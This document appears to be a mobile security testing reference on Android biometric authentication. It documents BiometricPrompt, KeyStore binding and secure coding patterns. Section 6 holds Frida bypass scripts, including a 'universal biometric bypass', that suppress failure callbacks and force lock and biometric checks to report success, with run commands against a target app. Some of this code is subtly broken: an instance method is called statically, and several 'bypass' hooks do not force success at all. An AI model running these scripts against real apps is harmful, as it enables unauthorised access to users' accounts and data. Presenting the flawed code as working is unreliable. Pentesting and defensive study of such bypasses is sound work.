# Biometric Authentication Testing - Comprehensive Reference

**Source Verification**: Android Developer Documentation (developer.android.com), OWASP MASTG v1.7+

---

## 1. Android Biometric APIs Overview

### 1.1 API Evolution

| API | Android Version | Status | Package |
|-----|---------------|--------|---------|
| `FingerprintManager` | 6.0+ (API 23-28) | **DEPRECATED** | `android.hardware.fingerprint` |
| `BiometricPrompt` | 9.0+ (API 28+) | **Current** | `android.hardware.biometrics` |
| `BiometricManager` | 10.0+ (API 29+) | **Current** | `android.hardware.biometrics` |
| `CredentialManager` | 14.0+ (API 34+) | **Current** | `android.credentials` |

### 1.2 Official Class Documentation

#### BiometricPrompt (android.hardware.biometrics)

**Constructors:**
```java
BiometricPrompt(Context, Executor, AuthenticationCallback)
BiometricPrompt(Context, Executor, AuthenticationCallback, CryptoObject)
```

**Methods:**
```java
void authenticate(PromptInfo info, CancellationSignal signal, Executor executor, AuthenticationCallback callback)
void authenticate(PromptInfo info, CryptoObject crypto, CancellationSignal signal, Executor executor, AuthenticationCallback callback)
```

#### BiometricPrompt.AuthenticationCallback

```java
void onAuthenticationSucceeded(AuthenticationResult result)
void onAuthenticationFailed()
void onAuthenticationError(int errorCode, CharSequence errString)
void onAuthenticationHelp(int helpCode, CharSequence helpString)
```

#### BiometricPrompt.AuthenticationResult

```java
int getAuthenticationType()
// Returns:
//   - AUTHENTICATION_RESULT_TYPE_BIOMETRIC (1)
//   - AUTHENTICATION_RESULT_TYPE_DEVICE_CREDENTIAL (2)

CryptoObject getCryptoObject()
```

#### BiometricPrompt.PromptInfo.Builder

```java
new PromptInfo.Builder()
    .setTitle("Authenticate")
    .setSubtitle("Use your biometric")
    .setNegativeButtonText("Cancel")
    .setAllowedAuthenticators(BIOMETRIC_STRONG | DEVICE_CREDENTIAL)
    // or setAllowedAuthenticators(BIOMETRIC_WEAK) for weaker biometrics
    .build()
```

#### BiometricManager (android.hardware.biometrics)

```java
int canAuthenticate(int authenticators)
// authenticators: BIOMETRIC_STRONG, BIOMETRIC_WEAK, DEVICE_CREDENTIAL
// Returns: BIOMETRIC_SUCCESS, BIOMETRIC_ERROR_NO_HARDWARE, BIOMETRIC_ERROR_NONE_ENROLLED, etc.
```

#### BiometricManager.Authenticators (Interface)

```java
int BIOMETRIC_STRONG    // Fingerprint, Face, Iris - strong liveness
int BIOMETRIC_WEAK      // Convenience biometrics
int DEVICE_CREDENTIAL   // PIN, Password, Pattern
```

---

## 2. Credential Manager API (Android 14+)

**Package**: `android.credentials`

### 2.1 Main Classes

| Class | Purpose |
|-------|---------|
| `CredentialManager` | Central system service for credential operations |
| `CreateCredentialRequest` | Request to register a credential |
| `GetCredentialRequest` | Request to retrieve a credential |
| `GetCredentialResponse` | Response containing the credential |
| `Credential` | Base credential representation |
| `CredentialOption` | Configuration for credential options |

### 2.2 Usage Pattern

```java
// Get CredentialManager
CredentialManager credentialManager = context.getSystemService(CredentialManager.class);

// Create request
GetCredentialRequest request = new GetCredentialRequest.Builder()
    .addCredentialOption(credentialOption)
    .build();

// Get credential
credentialManager.getCredential(context, request, cancellationSignal, executor,
    new OutcomeReceiver<GetCredentialResponse, GetCredentialException>() {
        @Override
        public void onResult(GetCredentialResponse result) {
            // Handle credential
        }
        @Override
        public void onError(GetCredentialException e) {
            // Handle error
        }
    });
```

### 2.3 Security Boundaries

1. **Process Isolation**: Credential Manager runs in separate system process
2. **User Verification**: Required via biometrics or lockscreen
3. **Hardware Keystore**: Private keys never leave secure enclave
4. **Key Access Control**: Keys can be bound to specific apps/user verification

---

## 3. Biometric Authentication Flow

### 3.1 Secure Flow with CryptoObject (Recommended)

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  App            │     │  BiometricPrompt │     │  Android        │
│                 │     │                 │     │  KeyStore       │
└────────┬────────┘     └────────┬────────┘     └────────┬────────┘
         │                      │                      │
         │ 1. Create Key        │                      │
         │─────────────────────>│                      │
         │                      │                      │ 2. Store Key
         │                      │                      │   (userAuthRequired=true)
         │                      │                      │─────────────────────>
         │                      │                      │
         │ 3. authenticate()    │                      │
         │ with CryptoObject    │                      │
         │─────────────────────>│                      │
         │                      │                      │
         │                      │ 4. Biometric Prompt  │
         │                      │─────────────────────>
         │                      │                      │
         │                      │ 5. Auth Success      │
         │                      │<─────────────────────
         │ 6. onAuthSuccess()   │
         │<─────────────────────│
         │                      │                      │
         │ 7. Use Key           │                      │
         │ (Key released to app)│                      │
         │─────────────────────>│                      │
         │                      │                      │
```

### 3.2 KeyStore Key Generation (Secure Implementation)

```java
// Generate key in Android KeyStore with biometric binding
KeyGenerator keyGenerator = KeyGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

KeyGenParameterSpec.Builder builder = new KeyGenParameterSpec.Builder(
    KEY_ALIAS,
    KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_CBC)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)
    .setUserAuthenticationRequired(true)  // CRITICAL: Requires auth before use
    .setInvalidatedByBiometricEnrollment(true);  // Invalidates if new biometric enrolled

// For session-based keys (auth required every time)
builder.setUserAuthenticationValidityDurationSeconds(-1);

// Or for time-based keys (auth valid for N seconds)
builder.setUserAuthenticationValidityDurationSeconds(30);

keyGenerator.init(builder.build());
keyGenerator.generateKey();
```

---

## 4. FingerprintManager vs BiometricPrompt

### 4.1 FingerprintManager (DEPRECATED)

**Package**: `android.hardware.fingerprint`
**Status**: Deprecated in Android 9 (API 28)

```java
// DEPRECATED - DO NOT USE
FingerprintManager fingerprintManager =
    (FingerprintManager) context.getSystemService(Context.FINGERPRINT_SERVICE);

// Deprecated methods:
// - authenticate(AuthenticationCallback, int, boolean, CancellationSignal, int)
// - hasEnrolledFingerprints()
// - isHardwareDetected()
```

### 4.2 BiometricPrompt (Current)

**Package**: `android.hardware.biometrics`
**Status**: Current standard since Android 9

```java
// Current recommended approach
BiometricPrompt biometricPrompt = new BiometricPrompt(
    context,
    ContextCompat.getMainExecutor(context),
    new AuthenticationCallback() {
        @Override
        public void onAuthenticationSucceeded(AuthenticationResult result) {
            // Check result.getAuthenticationType()
            // Check result.getCryptoObject()
            super.onAuthenticationSucceeded(result);
        }
    });

PromptInfo promptInfo = new PromptInfo.Builder()
    .setTitle("Biometric Login")
    .setSubtitle("Use your fingerprint")
    .setNegativeButtonText("Cancel")
    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)
    .build();

biometricPrompt.authenticate(promptInfo, cancellationSignal, mainExecutor, authenticationCallback);
```

### 4.3 BiometricPromptCompat (AndroidX)

**Package**: `androidx.biometric`

For backward compatibility (Android 6.0+):

```java
BiometricPrompt biometricPrompt = new BiometricPrompt(
    this,
    getMainExecutor(),
    new BiometricPrompt.AuthenticationCallback() {
        // Same as above
    });

BiometricManager biometricManager = BiometricManager.from(this);
int canAuthenticate = biometricManager.canAuthenticate(
    BiometricManager.Authenticators.BIOMETRIC_STRONG);
```

---

## 5. FaceManager API (Verification Status: UNVERIFIED)

### 5.1 Known Information

The `android.hardware.face` package exists in AOSP source code, but official API documentation was not verifiable at time of research.

**Known Classes (from AOSP source)**:
- `FaceManager` - manages face authentication
- `FaceManager.AuthenticationCallback` - callback for auth results

**Note**: Face authentication implementation varies by OEM. Google Pixel uses Face Unlock with hardware-backed security (Titan M2 chip), while other OEMs may have different implementations.

### 5.2 Testing Approach

```javascript
// Frida: Hook FaceManager if it exists
Java.perform(function() {
    var FaceManager = Java.use('android.hardware.face.FaceManager');
    if (FaceManager) {
        console.log("[*] FaceManager found");
        // Hook methods
    }
});
```

---

## 6. Frida Bypass Techniques

### 6.1 OWASP MASTG References

**Android (MASTG Reference)**:
> "BiometricPrompt.authenticate(PromptInfo) without CryptoObject can be bypassed by dynamic instrumentation (e.g., Frida)"

### 6.2 BiometricPrompt Callback Hook

```javascript
// biometric-bypass.js - Hook BiometricPrompt.AuthenticationCallback
// Based on: OWASP FriList, WithSecureLABS

rpc.exports = {
    bypassBiometric: function() {
        Java.perform(function() {
            // Hook AuthenticationCallback
            var AuthenticationCallback = Java.use(
                'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
            );

            // Override onAuthenticationSucceeded
            AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
                console.log('[*] BiometricAuth: onAuthenticationSucceeded called');
                // Optionally check the result
                var authType = result.getAuthenticationType();
                console.log('[*] Auth type: ' + authType);
                // Call original
                this.onAuthenticationSucceeded(result);
            };

            // Force success on onAuthenticationFailed
            AuthenticationCallback.onAuthenticationFailed.implementation = function() {
                console.log('[*] BiometricAuth: onAuthenticationFailed called - BYPASSING');
                // Return without calling original to suppress failure
            };

            // Handle errors gracefully (not blocking)
            AuthenticationCallback.onAuthenticationError.implementation = function(errorCode, errString) {
                console.log('[*] BiometricAuth: onAuthenticationError - ' + errorCode + ': ' + errString);
                this.onAuthenticationError(errorCode, errString);
            };
        });
    }
};

// Auto-run
setImmediate(rpc.exports.bypassBiometric);
```

### 6.3 CryptoObject Bypass Hook

```javascript
// Hook BiometricPrompt.CryptoObject binding
Java.perform(function() {
    var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    var CryptoObject = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');

    // Hook authenticate with CryptoObject
    BiometricPrompt.authenticate.implementation = function(promptInfo, crypto, signal, executor, callback) {
        console.log('[*] BiometricPrompt.authenticate called');

        if (crypto !== null) {
            console.log('[*] CryptoObject present - attempting to extract key');
            // The crypto object contains references to the bound key
            // In some implementations, we can potentially extract crypto operations
        }

        // Call original
        return this.authenticate(promptInfo, crypto, signal, executor, callback);
    };
});
```

### 6.4 KeyguardManager PIN Bypass

```javascript
// Bypass screen lock check via KeyguardManager
Java.perform(function() {
    var KeyguardManager = Java.use('android.app.KeyguardManager');

    // isDeviceSecure - checks if any lock is set
    KeyguardManager.isDeviceSecure.implementation = function() {
        console.log('[*] KeyguardManager.isDeviceSecure bypassed');
        return true; // Return true to pretend secure lock exists
    };

    // isKeyguardSecure - checks if keyguard is secured
    KeyguardManager.isKeyguardSecure.implementation = function() {
        console.log('[*] KeyguardManager.isKeyguardSecure bypassed');
        return true;
    };
});
```

### 6.5 BiometricManager Check Bypass

```javascript
// Bypass BiometricManager.canAuthenticate
Java.perform(function() {
    var BiometricManager = Java.use('android.hardware.biometrics.BiometricManager');
    var Authenticators = Java.use('android.hardware.biometrics.BiometricManager$Authenticators');

    BiometricManager.canAuthenticate.implementation = function(authenticators) {
        console.log('[*] BiometricManager.canAuthenticate called with: ' + authenticators);
        // Return BIOMETRIC_SUCCESS (0) to indicate biometrics available
        return 0; // BIOMETRIC_SUCCESS
    };
});
```

### 6.6 Complete Biometric Bypass Script

```javascript
// biometric-bypass-complete.js
// Universal biometric bypass for Android

rpc.exports = {
    bypassBiometricComplete: function() {
        Java.perform(function() {
            console.log('[*] Loading biometric bypass...');

            // 1. Hook BiometricManager.canAuthenticate
            try {
                var BiometricManager = Java.use('android.hardware.biometrics.BiometricManager');
                BiometricManager.canAuthenticate.implementation = function(authenticators) {
                    console.log('[*] Bypassing BiometricManager.canAuthenticate');
                    return 0; // BIOMETRIC_SUCCESS
                };
            } catch(e) { console.log('[-] BiometricManager not found'); }

            // 2. Hook BiometricPrompt AuthenticationCallback
            try {
                var AuthenticationCallback = Java.use(
                    'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
                );

                AuthenticationCallback.onAuthenticationSucceeded.implementation = function(result) {
                    console.log('[*] onAuthenticationSucceeded - allowing');
                    this.onAuthenticationSucceeded(result);
                };

                AuthenticationCallback.onAuthenticationFailed.implementation = function() {
                    console.log('[*] onAuthenticationFailed - suppressing');
                    // Don't call original - prevents app from seeing failure
                };

                AuthenticationCallback.onAuthenticationError.implementation = function(code, msg) {
                    // Log but allow to propagate
                    console.log('[*] onAuthenticationError: ' + code + ' - ' + msg);
                    this.onAuthenticationError(code, msg);
                };
            } catch(e) { console.log('[-] BiometricPrompt callback hook failed: ' + e); }

            // 3. Hook FingerprintManager (deprecated but some apps still use)
            try {
                var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
                FingerprintManager.authenticate.implementation = function(crypto, signal, flags, callback, opts) {
                    console.log('[*] Bypassing deprecated FingerprintManager.authenticate');
                    // Trigger success callback
                    var result = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult').$new();
                    callback.onAuthenticationSucceeded(result);
                    return 0;
                };
            } catch(e) { console.log('[-] FingerprintManager not found (expected)'); }

            // 4. Hook KeyguardManager checks
            try {
                var KeyguardManager = Java.use('android.app.KeyguardManager');
                KeyguardManager.isDeviceSecure.implementation = function() {
                    return true;
                };
            } catch(e) {}

            console.log('[*] Biometric bypass loaded');
        });
    }
};

setImmediate(rpc.exports.bypassBiometricComplete);
```

### 6.7 Usage

```bash
# Run against app
frida -U -f com.target.app -l biometric-bypass-complete.js

# Or spawn and attach
frida -U -f com.target.app -l biometric-bypass-complete.js

# With objection
objection explore
android biometric_disable
```

---

## 7. Testing Methodology

### 7.1 Static Analysis Checklist

#### Manifest Analysis
```xml
<!-- Check for biometric permissions -->
<uses-permission android:name="android.permission.USE_BIOMETRIC" />
<uses-permission android:name="android.permission.USE_FINGERPRINT" />

<!-- Check if biometrics required -->
<uses-feature android:name="android.hardware.fingerprint" android:required="true|false" />
<uses-feature android:name="android.hardware.biometric" android:required="true|false" />
```

#### Code Analysis Patterns

**Search for BiometricPrompt usage:**
```java
// Vulnerable pattern - no CryptoObject
biometricPrompt.authenticate(promptInfo, cancellationSignal, executor, callback);

// Secure pattern - with CryptoObject
biometricPrompt.authenticate(promptInfo, cryptoObject, cancellationSignal, executor, callback);
```

**Search for KeyStore with biometric binding:**
```java
// Check for secure key generation
setUserAuthenticationRequired(true)
setInvalidatedByBiometricEnrollment(true)
setUserAuthenticationValidityDurationSeconds(-1)  // Session-based
```

**Search for deprecated FingerprintManager:**
```java
// Deprecated API usage
import android.hardware.fingerprint.FingerprintManager;
```

### 7.2 Dynamic Analysis Checklist

1. **Check Biometric Availability**
   ```javascript
   // Frida: Check if biometric hardware exists
   Java.perform(function() {
       var BiometricManager = Java.use('android.hardware.biometrics.BiometricManager');
       var result = BiometricManager.canAuthenticate(15); // BIOMETRIC_STRONG
       console.log('Can authenticate: ' + result);
   });
   ```

2. **Attempt Bypass**
   ```bash
   frida -U -f pkg -l biometric-bypass-complete.js
   ```

3. **Verify Authentication Type**
   ```javascript
   // After bypass, check what type of auth was "succeeded"
   Java.perform(function() {
       var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
       // Hook to log authentication type
   });
   ```

### 7.3 Attack Vectors

| Vector | Description | Frida Hook |
|--------|-------------|------------|
| Callback Override | Force `onAuthenticationSucceeded` | `AuthenticationCallback.onAuthenticationSucceeded` |
| Failure Suppression | Suppress `onAuthenticationFailed` | `AuthenticationCallback.onAuthenticationFailed` |
| CryptoObject Extraction | Extract key from crypto binding | `BiometricPrompt.authenticate` with crypto |
| KeyStore Key Theft | Extract keys from Android Keystore | `KeyStore.getInstance` operations |
| PIN Override | Bypass device credential check | `KeyguardManager.isDeviceSecure` |

---

## 8. Secure Implementation Guidelines

### 8.1 Minimum Secure Implementation

```java
// 1. Use BiometricPrompt with CryptoObject
// 2. Generate key with setUserAuthenticationRequired(true)
// 3. Set validity duration to -1 for session-based keys
// 4. Use BIOMETRIC_STRONG authenticators

KeyGenerator keyGenerator = KeyGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");

KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder(
    KEY_ALIAS,
    KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setUserAuthenticationRequired(true)
    .setInvalidatedByBiometricEnrollment(true)
    .setUserAuthenticationValidityDurationSeconds(-1) // Session key
    .build();

keyGenerator.init(spec);
SecretKey key = keyGenerator.generateKey();

// Use with BiometricPrompt
BiometricPrompt.CryptoObject cryptoObject = new BiometricPrompt.CryptoObject(
    cipher); // Cipher initialized with the key

biometricPrompt.authenticate(promptInfo, cryptoObject, signal, executor, callback);
```

### 8.2 What NOT to do

```java
// VULNERABLE: No CryptoObject
biometricPrompt.authenticate(promptInfo, cancellationSignal, executor, callback);

// VULNERABLE: Time-based validity (can be reused within window)
.setUserAuthenticationValidityDurationSeconds(30)

// VULNERABLE: Using deprecated FingerprintManager
FingerprintManager fm = getSystemService(FINGERPRINT_SERVICE);
fm.authenticate(callback, signal, 0, null, null);

// VULNERABLE: No user verification required
setUserAuthenticationRequired(false)
```

---

## 9. References

- [Android Developer - BiometricPrompt](https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt)
- [Android Developer - BiometricManager](https://developer.android.com/reference/android/hardware/biometrics/BiometricManager)
- [Android Developer - Credential Manager](https://developer.android.com/reference/android/credentials/package-summary)
- [OWASP MASTG - Testing Local Authentication (Android)](https://github.com/OWASP/owasp-mastg/blob/master/Document/0x05f-Testing-Local-Authentication.md)

---

## 10. Frida Scripts Available

| Script | Location | Purpose |
|--------|----------|---------|
| `biometric-bypass.js` | `assets/frida-scripts/` | Universal biometric bypass |
| `keystore-inspector.js` | `assets/frida-scripts/` | Inspect Keystore entries |

```bash
# Usage
frida -U -f pkg -l assets/frida-scripts/biometric-bypass.js
```
